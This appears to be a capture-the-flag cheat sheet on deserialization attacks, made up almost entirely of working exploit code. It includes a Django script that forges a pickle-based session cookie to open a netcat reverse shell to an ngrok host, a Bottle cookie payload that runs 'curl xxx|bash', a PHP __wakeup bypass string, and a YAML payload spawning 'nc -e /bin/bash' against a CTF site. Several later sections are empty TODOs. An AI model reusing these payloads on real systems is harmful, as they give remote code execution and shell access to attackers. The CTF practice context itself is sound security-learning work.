# Serialization

## Django Pickle

```
import subprocess
import pickle
from django.core import signing
from django.contrib.sessions.serializers import PickleSerializer
import requests

"""Change the following then change the cookie down"""
url = "http://challenge.nahamcon.com:30867/accounts/login/?next=/"
SECRET_KEY = '77m6p#v&(wk_s2+n5na-bqe!m)^zu)9typ#0c&@qd%8o6!'
Attacker_host = "8.tcp.ngrok.io"
Attacker_ip =  15762
""""""

class Exploit(object):
  def __reduce__(self):
    return (subprocess.Popen, (
      (f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {Attacker_host} {Attacker_ip} >/tmp/f"),
      0, # Bufsize
      None, # exec
      None, #stdin
      None, #stdout
      None, #stderr
      None, #preexec
      False, #close_fds
      True, # shell
      ))

Forged_cookie = signing.dumps(Exploit(),
    key=SECRET_KEY,
    salt='django.contrib.sessions.backends.signed_cookies',
    serializer=PickleSerializer,
    compress=True)

print("\n\t\t\t\t[*-*] Django Pickle exploiter [*-*]\n")
print(f"[+] Forged the cookie: {Forged_cookie}\n")
print("[*] Sending the Payload...")

cookies = {"csrftoken": "K2Vx551ZkgLOdBvbqWRGMvjlPne158JiW4zYmA9UrBSCnW5IRmWLGWHuY5P3KPjQ", "sessionid": Forged_cookie}
req = requests.get(url, cookies=cookies)
print(f"[!] Request status: {req.status_code}")
print("[!] Check you nc listener anyway")
```

## Bottle

According to the [Documentation](https://bottlepy.org/docs/dev/tutorial.html#tutorial-signed-cookies), Bottle auto un-serialize data in cookies.

```
import bottle
import requests
url='http://bottle-poem.ctf.sekai.team/sign'
secret = "Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu"
class Exploit:
    def __reduce__(self):
        return (eval, ('__import__("os").popen("curl xxx|bash")',))

exp = bottle.cookie_encode(
    ('session', {"name": [Exploit()]}),
    secret
)

print(exp)
```

## PHP

### Bypass \_\_wakeup

The following payload work for [php version 7.4.0-8.x.x](https://3v4l.org/ihNnN) which bypass `__wakeup`

```
C:10:"Sekai_Game":0:{}
C:10: "Sekai_Game":16:{s:5:"start";b:1;} # Malformed
```

## YAML

```
import yaml,subprocess,requests

class Payload(object):
        def __reduce__(self):
                return (subprocess.Popen,(tuple('nc IP PORT -e /bin/bash'.split(" ")),))
deserialized_data = yaml.dump(Payload())  
data1={"username":"fwordadmin","password":"////"}
print("[+] Payload is: "+deserialized_data)
#yaml.load(deserialized_data,Loader=yaml.Loader)
data2={"service":deserialized_data}
s=requests.Session()
r=s.post("https://useless.fword.wtf/login",data=data1)
if r.status_code==200:
        print("[+] Logged in successfully")
r=s.post("https://useless.fword.wtf/home",data=data2)
print("[+] Shell Spawned, check your listener)
```

## JAVA

* TODO

## .NET

* TODO

## JSON

* TODO

## RUBY

